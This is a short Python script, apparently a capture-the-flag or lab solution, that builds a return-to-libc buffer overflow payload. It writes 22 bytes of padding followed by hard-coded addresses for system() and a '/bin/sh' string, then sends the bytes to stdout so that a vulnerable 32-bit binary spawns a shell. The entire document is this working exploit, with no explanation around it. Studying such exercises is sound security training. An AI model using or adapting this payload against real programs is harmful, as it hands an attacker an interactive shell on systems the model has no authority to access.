import sys

sys_addy = 0x804fef0
bin_addy = 0x80b0bcc
ech_addy = 0x80b04fc

payload = (
    b'A' * 22 +
    int.to_bytes(sys_addy, 4, 'little') + b'A' * 4 +
    int.to_bytes(bin_addy, 4, 'little') + b'/bin/sh'
)

sys.stdout.buffer.write(payload)